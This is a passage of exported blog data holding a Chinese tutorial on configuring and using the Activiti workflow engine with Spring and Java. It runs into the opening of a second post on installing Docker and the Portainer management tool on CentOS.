encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///activiti&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;123456&quot;/&gt; &lt;property name=&quot;maxActive&quot; value=&quot;3&quot;/&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;1&quot;/&gt; &lt;/bean&gt; &lt;!--在默认方式下 bean的id 固定为 processEngineConfiguration--&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;!--引入上面配置好的 链接池--&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt; &lt;!--actviti数据库表在生成时的策略 true - 如果数据库中已经存在相应的表，那么直接使用，如果不存在，那么会创建--&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; # 4.3.2 SpringProcessEngineConfiguration 通过 org.activiti.spring.SpringProcessEngineConfiguration 与 Spring 整合。 创建 spring 与 activiti 的整合配置文件： activity-spring.cfg.xml（名称可修改） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.1.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-3.1.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.1.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.1.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-3.1.xsd &quot;&gt; &lt;!-- 工作流引擎配置bean --&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.spring.SpringProcessEngineConfiguration&quot;&gt; &lt;!-- 数据源 --&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;!-- 使用spring事务管理器 --&gt; &lt;property name=&quot;transactionManager&quot; ref=&quot;transactionManager&quot; /&gt; &lt;!-- 数据库策略 --&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;drop-create&quot; /&gt; &lt;!-- activiti的定时任务关闭 --&gt; &lt;property name=&quot;jobExecutorActivate&quot; value=&quot;false&quot; /&gt; &lt;/bean&gt; &lt;!-- 流程引擎 --&gt; &lt;bean id=&quot;processEngine&quot; class=&quot;org.activiti.spring.ProcessEngineFactoryBean&quot;&gt; &lt;property name=&quot;processEngineConfiguration&quot; ref=&quot;processEngineConfiguration&quot; /&gt; &lt;/bean&gt; &lt;!-- 资源服务service --&gt; &lt;bean id=&quot;repositoryService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getRepositoryService&quot; /&gt; &lt;!-- 流程运行service --&gt; &lt;bean id=&quot;runtimeService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getRuntimeService&quot; /&gt; &lt;!-- 任务管理service --&gt; &lt;bean id=&quot;taskService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getTaskService&quot; /&gt; &lt;!-- 历史管理service --&gt; &lt;bean id=&quot;historyService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getHistoryService&quot; /&gt; &lt;!-- 用户管理service --&gt; &lt;bean id=&quot;identityService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getIdentityService&quot; /&gt; &lt;!-- 引擎管理service --&gt; &lt;bean id=&quot;managementService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getManagementService&quot; /&gt; &lt;!-- 数据源 --&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/activiti&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;mysql&quot; /&gt; &lt;property name=&quot;maxActive&quot; value=&quot;3&quot; /&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;1&quot; /&gt; &lt;/bean&gt; &lt;!-- 事务管理器 --&gt; &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;/bean&gt; &lt;!-- 通知 --&gt; &lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt; &lt;tx:attributes&gt;&lt;/tx:attributes&gt; &lt;!-- 传播行为 --&gt; &lt;tx:method name=&quot;save*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;insert*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;delete*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;update*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;find*&quot; propagation=&quot;SUPPORTS&quot; read-only=&quot;true&quot; /&gt; &lt;tx:method name=&quot;get*&quot; propagation=&quot;SUPPORTS&quot; read-only=&quot;true&quot; /&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 切面，根据具体项目修改切点配置 --&gt; &lt;aop:config proxy-target-class=&quot;true&quot;&gt; &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut=&quot;execution(* com.itheima.ihrm.service.impl.*.(..))&quot;* /&gt; &lt;/aop:config&gt;&lt;/beans&gt; # 创建 processEngineConfiguration 1ProcessEngineConfiguration configuration = ProcessEngineConfiguration.createProcessEngineConfigurationFromResource(&quot;activiti.cfg.xml&quot;) 上边的代码要求 activiti.cfg.xml 中必须有一个 processEngineConfiguration 的 bean 也可以使用下边的方法，更改 bean 的名字： 1ProcessEngineConfiguration.createProcessEngineConfigurationFromResource(String resource, String beanName); # 4.4 工作流引擎创建 工作流引擎（ProcessEngine），相当于一个门面接口，通过 ProcessEngineConfiguration 创建 processEngine，通过 ProcessEngine 创建各个 service 接口。 # 4.4.1 默认创建方式 将 activiti.cfg.xml 文件名及路径固定，且 activiti.cfg.xml 文件中有 processEngineConfiguration 的配置， 可以使用如下代码创建 processEngine: 123//直接使用工具类 ProcessEngines，使用classpath下的activiti.cfg.xml中的配置创建processEngineProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();System.out.println(processEngine); # 4.4.2 一般创建方式 1234//先构建ProcessEngineConfigurationProcessEngineConfiguration configuration = ProcessEngineConfiguration.createProcessEngineConfigurationFromResource(&quot;activiti.cfg.xml&quot;);//通过ProcessEngineConfiguration创建ProcessEngine，此时会创建数据库ProcessEngine processEngine = configuration.buildProcessEngine(); # 4.5 Servcie 服务接口 Service 是工作流引擎提供用于进行工作流部署、执行、管理的服务接口，我们使用这些接口可以就是操作服务对应的数据表 # 4.5.1 Service 创建方式 通过 ProcessEngine 创建 Service 方式如下： 123RuntimeService runtimeService = processEngine.getRuntimeService();RepositoryService repositoryService = processEngine.getRepositoryService();TaskService taskService = processEngine.getTaskService(); # 4.5.2 Service 总览 service 名称 service 作用 RepositoryService activiti 的资源管理类 RuntimeService activiti 的流程运行管理类 TaskService activiti 的任务管理类 HistoryService activiti 的历史管理类 ManagerService activiti 的引擎管理类 简单介绍： RepositoryService 是 activiti 的资源管理类，提供了管理和控制流程发布包和流程定义的操作。使用工作流建模工具设计的业务流程图需要使用此 service 将流程定义文件的内容部署到计算机。 除了部署流程定义以外还可以：查询引擎中的发布包和流程定义。 暂停或激活发布包，对应全部和特定流程定义。 暂停意味着它们不能再执行任何操作了，激活是对应的反向操作。获得多种资源，像是包含在发布包里的文件， 或引擎自动生成的流程图。 获得流程定义的 pojo 版本， 可以用来通过 java 解析流程，而不必通过 xml。 # RuntimeService Activiti 的流程运行管理类。可以从这个服务类中获取很多关于流程执行相关的信息 # TaskService Activiti 的任务管理类。可以从这个类中获取任务的信息。 # HistoryService Activiti 的历史管理类，可以查询历史信息，执行流程时，引擎会保存很多数据（根据配置），比如流程实例启动时间，任务的参与者， 完成任务的时间，每个流程实例的执行路径，等等。 这个服务主要通过查询功能来获得这些数据。 # ManagementService Activiti 的引擎管理类，提供了对 Activiti 流程引擎的管理和维护功能，这些功能不在工作流驱动的应用程序中使用，主要用于 Activiti 系统的日常维护。 # 五、Activiti 入门 在本章内容中，我们来创建一个 Activiti 工作流，并启动这个流程。 创建 Activiti 工作流主要包含以下几步： 1、定义流程，按照 BPMN 的规范，使用流程定义工具，用流程符号把整个流程描述出来 2、部署流程，把画好的流程定义文件，加载到数据库中，生成表的数据 3、启动流程，使用 java 代码来操作数据库表中的内容 # 5.1 流程符号 BPMN 2.0 是业务流程建模符号 2.0 的缩写。 它由 Business Process Management Initiative 这个非营利协会创建并不断发展。作为一种标识，BPMN 2.0 是使用一些符号来明确业务流程设计流程图的一整套符号规范，它能增进业务建模时的沟通效率。 目前 BPMN2.0 是最新的版本，它用于在 BPM 上下文中进行布局和可视化的沟通。 接下来我们先来了解在流程设计中常见的 符号。 BPMN2.0 的基本符合主要包含： # 事件 Event # 活动 Activity 活动是工作或任务的一个通用术语。一个活动可以是一个任务，还可以是一个当前流程的子处理流程； 其次，你还可以为活动指定不同的类型。常见活动如下： # 网关 GateWay 网关用来处理决策，有几种常用网关需要了解： # 排他网关 (x) —— 只有一条路径会被选择。流程执行到该网关时，按照输出流的顺序逐个计算，当条件的计算结果为 true 时，继续执行当前网关的输出流； 如果多条线路计算结果都是 true，则会执行第一个值为 true 的线路。如果所有网关计算结果没有 true，则引擎会抛出异常。 排他网关需要和条件顺序流结合使用，default 属性指定默认顺序流，当所有的条件不满足时会执行默认顺序流。 # 并行网关 (+) —— 所有路径会被同时选择 拆分 —— 并行执行所有输出顺序流，为每一条顺序流创建一个并行执行线路。 合并 —— 所有从并行网关拆分并执行完成的线路均在此等候，直到所有的线路都执行完成才继续向下执行。 # 包容网关 (+) —— 可以同时执行多条线路，也可以在网关上设置条件 拆分 —— 计算每条线路上的表达式，当表达式计算结果为 true 时，创建一个并行线路并继续执行 合并 —— 所有从并行网关拆分并执行完成的线路均在此等候，直到所有的线路都执行完成才继续向下执行。 # 事件网关 (+) —— 专门为中间捕获事件设置的，允许设置多个输出流指向多个不同的中间捕获事件。当流程执行到事件网关后，流程处于等待状态，需要等待抛出事件才能将等待状态转换为活动状态。 # 流向 Flow 流是连接两个流程节点的连线。常见的流向包含以下几种： # 5.2 流程设计器使用 # Activiti-Designer 使用 # Palette（画板） 在 idea 中安装插件即可使用，画板中包括以下结点： Connection— 连接 Event— 事件 Task— 任务 Gateway— 网关 Container— 容器 Boundary event— 边界事件 Intermediate event- - 中间事件 流程图设计完毕保存生成.bpmn 文件 # 新建流程 (IDEA 工具) 首先选中存放图形的目录 (选择 resources 下的 bpmn 目录)，点击菜单：New -&gt; BpmnFile，如图： 弹出如下图所示框，输入 evection 表示 出差审批流程： 起完名字 evection 后（默认扩展名为 bpmn），就可以看到流程设计页面，如图所示： 左侧区域是绘图区，右侧区域是 palette 画板区域 鼠标先点击画板的元素即可在左侧绘图 # 绘制流程 使用滑板来绘制流程，通过从右侧把图标拖拽到左侧的画板，最终效果如下： # 指定流程定义 Key 流程定义 key 即流程定义的标识，通过 properties 视图查看流程的 key # 指定任务负责人 在 properties 视图指定每个任务结点的负责人，如：填写出差申请的负责人为 zhangsan 经理审批负责人为 jerry 总经理审批负责人为 jack 财务审批负责人为 rose # 六、流程操作 # 6.1 流程定义 # 概述 流程定义是线下按照 bpmn2.0 标准去描述 业务流程，通常使用 idea 中的插件对业务流程进行建模。 使用 idea 下的 designer 设计器绘制流程，并会生成两个文件：.bpmn 和.png # .bpmn 文件 使用 activiti-desinger 设计业务流程，会生成.bpmn 文件，上面我们已经创建好了 bpmn 文件 BPMN 2.0 根节点是 definitions 节点。 这个元素中，可以定义多个流程定义（不过我们建议每个文件只包含一个流程定义， 可以简化开发过程中的维护难度）。 注意，definitions 元素 最少也要包含 xmlns 和 targetNamespace 的声明。 targetNamespace 可以是任意值，它用来对流程实例进行分类。 流程定义部分：定义了流程每个结点的描述及结点之间的流程流转。 流程布局定义：定义流程每个结点在流程图上的位置坐标等信息。 # 生成.png 图片文件 IDEA 工具中的操作方式 # 1、修改文件后缀为 xml 首先将 evection.bpmn 文件改名为 evection.xml，如下图： evection.xml 修改前的 bpmn 文件，效果如下： # 2、使用 designer 设计器打开.xml 文件 在 evection.xml 文件上面，点右键并选择 Diagrams 菜单，再选择 Show BPMN2.0 Designer… # 3、查看打开的文件 打开后，却出现乱码，如图： # 4、解决中文乱码 1、打开 Settings，找到 File Encodings，把 encoding 的选项都选择 UTF-8 2、打开 IDEA 安装路径，找到如下的安装目录 根据自己所安装的版本来决定，我使用的是 64 位的 idea，所以在 idea64.exe.vmoptions 文件的最后一行追加一条命令： -Dfile.encoding=UTF-8 如下所示： 一定注意，不要有空格，否则重启 IDEA 时会打不开，然后 重启 IDEA。 如果以上方法已经做完，还出现乱码，就再修改一个文件，并在文件的末尾添加： -Dfile.encoding=UTF-8，然后重启 idea，如图： 最后重新在 evection.xml 文件上面，点右键并选择 Diagrams 菜单，再选择 Show BPMN2.0 Designer…，看到生成图片，如图： 到此，解决乱码问题 # 5、导出为图片文件 点击 Export To File 的小图标，打开如下窗口，注意填写文件名及扩展名，选择好保存图片的位置： 然后，我们把 png 文件拷贝到 resources 下的 bpmn 目录，并且把 evection.xml 改名为 evection.bpmn。 # 6.2 流程定义部署 # 概述 将上面在设计器中定义的流程部署到 activiti 数据库中，就是流程定义部署。 通过调用 activiti 的 api 将流程定义的 bpmn 和 png 两个文件一个一个添加部署到 activiti 中，也可以将两个文件打成 zip 包进行部署。 # 单个文件部署方式 分别将 bpmn 文件和 png 图片文件部署。 123456789101112131415161718192021public class ActivitiDemo { /** * 部署流程定义 */ @Test public void testDeployment(){// 1、创建ProcessEngine ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 2、得到RepositoryService实例 RepositoryService repositoryService = processEngine.getRepositoryService();// 3、使用RepositoryService进行部署 Deployment deployment = repositoryService.createDeployment() .addClasspathResource(&quot;bpmn/evection.bpmn&quot;) // 添加bpmn资源 .addClasspathResource(&quot;bpmn/evection.png&quot;) // 添加png资源 .name(&quot;出差申请流程&quot;) .deploy();// 4、输出部署信息 System.out.println(&quot;流程部署id：&quot; + deployment.getId()); System.out.println(&quot;流程部署名称：&quot; + deployment.getName()); }} 执行此操作后 activiti 会将上边代码中指定的 bpm 文件和图片文件保存在 activiti 数据库。 # 压缩包部署方式 将 evection.bpmn 和 evection.png 压缩成 zip 包。 12345678910111213141516171819@Test public void deployProcessByZip() { // 定义zip输入流 InputStream inputStream = this .getClass() .getClassLoader() .getResourceAsStream( &quot;bpmn/evection.zip&quot;); ZipInputStream zipInputStream = new ZipInputStream(inputStream); // 获取repositoryService RepositoryService repositoryService = processEngine .getRepositoryService(); // 流程部署 Deployment deployment = repositoryService.createDeployment() .addZipInputStream(zipInputStream) .deploy(); System.out.println(&quot;流程部署id：&quot; + deployment.getId()); System.out.println(&quot;流程部署名称：&quot; + deployment.getName()); } 执行此操作后 activiti 会将上边代码中指定的 bpm 文件和图片文件保存在 activiti 数据库。 # 操作数据表 流程定义部署后操作 activiti 的 3 张表如下： act_re_deployment 流程定义部署表，每部署一次增加一条记录 act_re_procdef 流程定义表，部署每个新的流程定义都会在这张表中增加一条记录 act_ge_bytearray 流程资源表 接下来我们来看看，写入了什么数据： 12SELECT * FROM act_re_deployment #流程定义部署表，记录流程部署信息1 结果： 1SELECT * FROM act_re_procdef #流程定义表，记录流程定义信息 结果： 注意，KEY 这个字段是用来唯一识别不同流程的关键字 12SELECT * FROM act_ge_bytearray #资源表 结果： 注意： act_re_deployment 和 act_re_procdef 一对多关系，一次部署在流程部署表生成一条记录，但一次部署可以部署多个流程定义，每个流程定义在流程定义表生成一条记录。每一个流程定义在 act_ge_bytearray 会存在两个资源记录，bpmn 和 png。 建议：一次部署一个流程，这样部署表和流程定义表是一对一有关系，方便读取流程部署及流程定义信息。 # 6.3 启动流程实例 流程定义部署在 activiti 后就可以通过工作流管理业务流程了，也就是说上边部署的出差申请流程可以使用了。 针对该流程，启动一个流程表示发起一个新的出差申请单，这就相当于 java 类与 java 对象的关系，类定义好后需要 new 创建一个对象使用，当然可以 new 多个对象。对于请出差申请流程，张三发起一个出差申请单需要启动一个流程实例，出差申请单发起一个出差单也需要启动一个流程实例。 代码如下： 1234567891011121314151617 /** * 启动流程实例 */ @Test public void testStartProcess(){// 1、创建ProcessEngine ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 2、获取RunTimeService RuntimeService runtimeService = processEngine.getRuntimeService();// 3、根据流程定义Id启动流程 ProcessInstance processInstance = runtimeService .startProcessInstanceByKey(&quot;myEvection&quot;);// 输出内容 System.out.println(&quot;流程定义id：&quot; + processInstance.getProcessDefinitionId()); System.out.println(&quot;流程实例id：&quot; + processInstance.getId()); System.out.println(&quot;当前活动Id：&quot; + processInstance.getActivityId()); } 输出内容如下： 操作数据表 act_hi_actinst 流程实例执行历史 act_hi_identitylink 流程的参与用户历史信息 act_hi_procinst 流程实例历史信息 act_hi_taskinst 流程任务历史信息 act_ru_execution 流程执行信息 act_ru_identitylink 流程的参与用户信息 act_ru_task 任务信息 # 6.4 任务查询 流程启动后，任务的负责人就可以查询自己当前需要处理的任务，查询出来的任务都是该用户的待办任务。 12345678910111213141516171819202122232425/** * 查询当前个人待执行的任务 */ @Test public void testFindPersonalTaskList() {// 任务负责人 String assignee = &quot;zhangsan&quot;; ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 创建TaskService TaskService taskService = processEngine.getTaskService();// 根据流程key 和 任务负责人 查询任务 List&lt;Task&gt; list = taskService.createTaskQuery() .processDefinitionKey(&quot;myEvection&quot;) //流程Key .taskAssignee(assignee)//只查询该任务负责人的任务 .list(); for (Task task : list) { System.out.println(&quot;流程实例id：&quot; + task.getProcessInstanceId()); System.out.println(&quot;任务id：&quot; + task.getId()); System.out.println(&quot;任务负责人：&quot; + task.getAssignee()); System.out.println(&quot;任务名称：&quot; + task.getName()); } } 输出结果如下： 1234流程实例id：2501任务id：2505任务负责人：zhangsan任务名称：创建出差申请 # 6.5 流程任务处理 任务负责人查询待办任务，选择任务进行处理，完成任务。 123456789101112131415161718// 完成任务 @Test public void completTask(){// 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 获取taskService TaskService taskService = processEngine.getTaskService();// 根据流程key 和 任务的负责人 查询任务// 返回一个任务对象 Task task = taskService.createTaskQuery() .processDefinitionKey(&quot;myEvection&quot;) //流程Key .taskAssignee(&quot;zhangsan&quot;) //要查询的负责人 .singleResult();// 完成任务,参数：任务id taskService.complete(task.getId()); } # 6.6 流程定义信息查询 查询流程相关信息，包含流程定义，流程部署，流程定义版本 123456789101112131415161718192021222324252627282930 /** * 查询流程定义 */ @Test public void queryProcessDefinition(){ // 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// repositoryService RepositoryService repositoryService = processEngine.getRepositoryService();// 得到ProcessDefinitionQuery 对象 ProcessDefinitionQuery processDefinitionQuery = repositoryService.createProcessDefinitionQuery();// 查询出当前所有的流程定义// 条件：processDefinitionKey =evection// orderByProcessDefinitionVersion 按照版本排序// desc倒叙// list 返回集合 List&lt;ProcessDefinition&gt; definitionList = processDefinitionQuery.processDefinitionKey(&quot;myEvection&quot;) .orderByProcessDefinitionVersion() .desc() .list();// 输出流程定义信息 for (ProcessDefinition processDefinition : definitionList) { System.out.println(&quot;流程定义 id=&quot;+processDefinition.getId()); System.out.println(&quot;流程定义 name=&quot;+processDefinition.getName()); System.out.println(&quot;流程定义 key=&quot;+processDefinition.getKey()); System.out.println(&quot;流程定义 Version=&quot;+processDefinition.getVersion()); System.out.println(&quot;流程部署ID =&quot;+processDefinition.getDeploymentId()); } } 输出结果： 1234流程定义id：myEvection:1:4流程定义名称：出差申请单流程定义key：myEvection流程定义版本：1 # 6.7 流程删除 12345678910111213public void deleteDeployment() { // 流程部署id String deploymentId = &quot;1&quot;; ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine(); // 通过流程引擎获取repositoryService RepositoryService repositoryService = processEngine .getRepositoryService(); //删除流程定义，如果该流程定义已有流程实例启动则删除时出错 repositoryService.deleteDeployment(deploymentId); //设置true 级联删除流程定义，即使该流程有流程实例启动也可以删除，设置为false非级别删除方式，如果流程 //repositoryService.deleteDeployment(deploymentId, true); } 说明： 使用repositoryService删除流程定义，历史表信息不会被删除 1232. ``` 如果该流程定义下没有正在运行的流程，则可以用普通删除。 如果该流程定义下存在已经运行的流程，使用普通删除报错，可用级联删除方法将流程及相关记录全部删除。 先删除没有完成流程节点，最后就可以完全删除流程定义信息 项目开发中级联删除操作一般只开放给超级管理员使用. # 6.8 流程资源下载 现在我们的流程资源文件已经上传到数据库了，如果其他用户想要查看这些资源文件，可以从数据库中把资源文件下载到本地。 解决方案有： 1、jdbc 对 blob 类型，clob 类型数据读取出来，保存到文件目录 2、使用 activiti 的 api 来实现 使用 commons-io.jar 解决 IO 的操作 引入 commons-io 依赖包 12345&lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.6&lt;/version&gt;&lt;/dependency&gt; 通过流程定义对象获取流程定义资源，获取 bpmn 和 png 123456789101112131415161718192021222324252627282930313233343536373839404142import org.apache.commons.io.IOUtils;@Test public void deleteDeployment(){// 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 获取repositoryService RepositoryService repositoryService = processEngine.getRepositoryService();// 根据部署id 删除部署信息,如果想要级联删除，可以添加第二个参数，true repositoryService.deleteDeployment(&quot;1&quot;); } public void queryBpmnFile() throws IOException {// 1、得到引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 2、获取repositoryService RepositoryService repositoryService = processEngine.getRepositoryService();// 3、得到查询器：ProcessDefinitionQuery，设置查询条件,得到想要的流程定义 ProcessDefinition processDefinition = repositoryService.createProcessDefinitionQuery() .processDefinitionKey(&quot;myEvection&quot;) .singleResult();// 4、通过流程定义信息，得到部署ID String deploymentId = processDefinition.getDeploymentId();// 5、通过repositoryService的方法，实现读取图片信息和bpmn信息// png图片的流 InputStream pngInput = repositoryService.getResourceAsStream(deploymentId, processDefinition.getDiagramResourceName());// bpmn文件的流 InputStream bpmnInput = repositoryService.getResourceAsStream(deploymentId, processDefinition.getResourceName());// 6、构造OutputStream流 File file_png = new File(&quot;d:/evectionflow01.png&quot;); File file_bpmn = new File(&quot;d:/evectionflow01.bpmn&quot;); FileOutputStream bpmnOut = new FileOutputStream(file_bpmn); FileOutputStream pngOut = new FileOutputStream(file_png);// 7、输入流，输出流的转换 IOUtils.copy(pngInput,pngOut); IOUtils.copy(bpmnInput,bpmnOut);// 8、关闭流 pngOut.close(); bpmnOut.close(); pngInput.close(); bpmnInput.close(); } 说明： deploymentId为流程部署ID 1232. ``` resource_name为act_ge_bytearray表中NAME_列的值 使用repositoryService的getDeploymentResourceNames方法可以获取指定部署下得所有文件的名称 1234. ``` 使用repositoryService的getResourceAsStream方法传入部署ID和资源图片名称可以获取部署下指定名称文件的输入流 最后的将输入流中的图片资源进行输出。 # 6.9 流程历史信息的查看 即使流程定义已经删除了，流程执行的历史信息通过前面的分析，依然保存在 activiti 的 act_hi_* 相关的表中。所以我们还是可以查询流程执行的历史信息，可以通过 HistoryService 来查看相关的历史记录。 12345678910111213141516171819202122232425262728 /** * 查看历史信息 */ @Test public void findHistoryInfo(){// 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 获取HistoryService HistoryService historyService = processEngine.getHistoryService();// 获取 actinst表的查询对象 HistoricActivityInstanceQuery instanceQuery = historyService.createHistoricActivityInstanceQuery();// 查询 actinst表，条件：根据 InstanceId 查询// instanceQuery.processInstanceId(&quot;2501&quot;);// 查询 actinst表，条件：根据 DefinitionId 查询 instanceQuery.processDefinitionId(&quot;myEvection:1:4&quot;);// 增加排序操作,orderByHistoricActivityInstanceStartTime 根据开始时间排序 asc 升序 instanceQuery.orderByHistoricActivityInstanceStartTime().asc();// 查询所有内容 List&lt;HistoricActivityInstance&gt; activityInstanceList = instanceQuery.list();// 输出 for (HistoricActivityInstance hi : activityInstanceList) { System.out.println(hi.getActivityId()); System.out.println(hi.getActivityName()); System.out.println(hi.getProcessDefinitionId()); System.out.println(hi.getProcessInstanceId()); System.out.println(&quot;&lt;==========================&gt;&quot;); } } # 总结 基本功能介绍以及完成了，如果还需要更加高级的功能比如挂起、激活流程实例、流程变量等请参考【https://andyoung.blog.csdn.net/article/details/118345330】。 工作流引擎 Activiti 与 Spring boot 结合会是开发跟简单，不如来看下 【工作流引擎 Activiti 实战系列】 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/02/04/%E3%80%90Activiti%E3%80%91Java%E5%B7%A5%E4%BD%9C%E6%B5%81%E5%BC%95%E6%93%8E%20Activiti%20%E4%B8%87%E5%AD%97%E8%AF%A6%E7%BB%86%E5%85%A5%E9%97%A8/"},{"title":"【Docker】Linux部署Docker","text":"# 【Docker】Linux 部署 Docker 接触一段时间 docker，这个工具大大提高了开发者打包应用的效率。 一直都是直接把镜像扔到到 docker 里构建容器启动，并没有深入了解。 本文由 alpha0808 大佬指导，如果要了解 docker 的概念以及命令，请去看大佬这篇 DOCKER 之入门篇 本篇文章集中于 linux 系统下对 docker 及相关组件的部署。 # 目录 一、安装 docker 二、镜像加速 获取阿里云镜像地址 添加加速器地址 三、可视化管理工具 Portainer 简介 展示 安装 镜像下载 容器运行 创建用户 docker 连接管理 四、补充 docker 开机自启 容器开机自启 # 一、安装 docker 按照官网 https://docs.docker.com/engine/install/centos/ 执行命令即可 12345678910111213141516171819202122232425#1.yum检查更新sudo yum check-update#2.删除旧版本sudo yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine#3.安装gcc环境yum -y install gccyum -y install gcc-c++#4.安装依赖项sudo yum install -y yum-utils device-mapper-persistent-data lvm2#5.将 Docker 存储库添加到 CentOSsudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo#使用阿里服务器下载yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo#如果没有执行命令1更新，那么此时执行命令即可yum makecache fast#6.下载dockersudo yum install -y docker #注意这样下载需要接受GPG秘钥，相当于一个数字指纹，指纹格式：060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35#或者社区版本yum -y install docker-ce#7.检查版本docker version#或者docker -v#8.查看docker进程docker ps 执行第 8 步，如果报错 “Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemo” 是因为 docker 还没启动 解决方案： 1systemctl start docker.service # 二、镜像加速 使用阿里云镜像地址来加速镜像下载的速度 # 获取阿里云镜像地址 点击容器镜像服务 镜像工具→镜像加速器，生成加速器地址 # 添加加速器地址 切换目录至 /etc/docker 1cd /etc/docker 编辑 daemon.js 文件 123{ &quot;registry-mirrors&quot;: [&quot;加速器地址&quot;]} 重启 docker 的伴随线程 1systemctl daemon-reload 重启 docker 服务 1systemctl restart docker # 三、可视化管理工具 Portainer # 简介 Portainer 是 Docker 的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm 集群和服务等集中管理和操作、登录用户管理和控制等功能 # 展示 首页 包含 docker-compose、容器、镜像、卷、网络总体概况 容器 包含容器的启动、暂停、杀死进程、重启、新增，监控，日志查看，容器控制台等功能。 镜像 包含镜像详细查看、删除、导入、导出等功能 # 安装 采用 docker 安装 # 镜像下载 查询 portainer 镜像 1docker search portainer 下载 portainer 镜像 1docker pull portainer/portainer # 容器运行 1docker run -p 9000:9000 --name portainer -v /var/run/docker.sock:/var/run/docker.sock -d portainer/portainer 开放 9000 端口 1firewall-cmd --zone=public --add-port=9000/tcp --permanent &amp;&amp; firewall-cmd --reload # 创建用户 访问 9000 